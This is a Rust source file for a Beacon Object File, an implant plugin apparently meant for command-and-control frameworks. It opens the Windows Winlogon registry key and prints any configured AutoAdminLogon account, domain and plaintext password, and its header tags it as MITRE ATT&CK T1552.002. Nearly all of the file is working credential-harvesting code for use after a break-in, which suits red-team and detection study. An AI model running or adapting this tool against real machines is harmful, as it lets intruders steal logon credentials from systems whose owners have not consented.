//! # AutoLogon Credential BOF
//!
//! Reads the Windows Winlogon AutoAdminLogon configuration and reports any
//! configured account and plaintext password values. It does not change the
//! registry.
//!
//! ## MITRE ATT&CK
//! - T1552.002 - Unsecured Credentials: Credentials in Registry
//!
//! ## Arguments
//! None.

#![no_std]

use alloc::{string::String, vec};
use rustbof::{eprintln, println};
use windows_sys::Win32::System::Registry::{
    HKEY, HKEY_LOCAL_MACHINE, KEY_READ, REG_EXPAND_SZ, REG_SZ, RegCloseKey, RegOpenKeyExW,
    RegQueryValueExW,
};

fn wide_null(value: &str) -> alloc::vec::Vec<u16> {
    value.encode_utf16().chain(core::iter::once(0)).collect()
}

fn read_string(key: HKEY, name: &str) -> Result<Option<String>, u32> {
    let name = wide_null(name);
    let mut kind = 0u32;
    let mut size = 0u32;
    let status = unsafe {
        RegQueryValueExW(
            key,
            name.as_ptr(),
            core::ptr::null(),
            &mut kind,
            core::ptr::null_mut(),
            &mut size,
        )
    };
    if status == 2 {
        return Ok(None);
    }
    if status != 0 {
        return Err(status);
    }
    if !matches!(kind, REG_SZ | REG_EXPAND_SZ) || !(2..=64 * 1024).contains(&size) {
        return Err(13);
    }

    let mut buffer = vec![0u16; (size as usize).div_ceil(2)];
    let mut read_size = size;
    let status = unsafe {
        RegQueryValueExW(
            key,
            name.as_ptr(),
            core::ptr::null(),
            &mut kind,
            buffer.as_mut_ptr() as *mut u8,
            &mut read_size,
        )
    };
    if status != 0 {
        return Err(status);
    }

    let units = (read_size as usize / 2).min(buffer.len());
    let length = buffer[..units]
        .iter()
        .position(|&unit| unit == 0)
        .unwrap_or(units);

    Ok(Some(String::from_utf16_lossy(&buffer[..length])))
}

#[rustbof::main]
fn main() {
    let path = wide_null("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
    let mut key = core::ptr::null_mut();
    let status = unsafe { RegOpenKeyExW(HKEY_LOCAL_MACHINE, path.as_ptr(), 0, KEY_READ, &mut key) };
    if status != 0 {
        eprintln!("[-] Winlogon registry open failed: {}", status);
        return;
    }

    println!("Winlogon AutoAdminLogon configuration");
    let mut present = 0u32;
    for (name, label) in [
        ("AutoAdminLogon", "enabled"),
        ("DefaultDomainName", "domain"),
        ("DefaultUserName", "username"),
        ("DefaultPassword", "password"),
        ("AltDefaultDomainName", "alternate domain"),
        ("AltDefaultUserName", "alternate username"),
    ] {
        match read_string(key, name) {
            Ok(Some(value)) if !value.is_empty() => {
                println!("[+] {}: {}", label, value);
                present += 1;
            }
            Ok(_) => {}
            Err(error) => eprintln!("[-] {} query failed: {}", name, error),
        }
    }

    unsafe { RegCloseKey(key) };
    if present == 0 {
        println!("[*] No AutoAdminLogon values were present.");
    } else {
        println!("[+] Values found: {}", present);
    }
}
